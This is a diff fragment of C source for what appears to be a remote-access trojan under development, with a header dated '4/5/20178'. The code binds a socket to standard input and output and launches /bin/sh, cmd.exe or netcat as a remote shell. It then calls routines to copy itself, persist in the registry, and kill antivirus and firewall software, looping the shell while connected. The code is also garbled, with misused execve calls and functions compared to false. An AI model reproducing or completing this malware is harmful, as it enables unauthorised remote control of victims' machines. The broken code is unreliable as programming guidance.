@@ -222,7 +222,7 @@ terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
      /*fflush(stdout);  DON'T! */
 
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
-     root = execve("/bin/sh -l", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
+     root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
 
      while(true);
 
@@ -238,37 +238,47 @@ terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
 
      {
 
-     {
+	     
+	     
+{
 
+	
       /* this is generic */
 
       if(auto_copy == false)
       perror("error in auto_copy");
       else
            auto_copy();
+      
       if(copy_to_registry == false)
       perror("error copying to registry");
       else
           copy_to_registry();
+      
       if(kill_antivirus == false)
       perror("kill anti virus failed...");
       else
           kill_antivirus();
+      
       if(kill_firewall == false)
       perror("kill firewall failed... retrying");
       else
           kill_firewall();
-      sleep(0.2);
+      
+	sleep(0.2);
 
-      }
+ }
 
       /*shell run while the connection for true */
 
-      do {
+      do 
+      
+      {
 
       shell();
 
-      }
+      
+ }
 
 
       while (connect == (true));
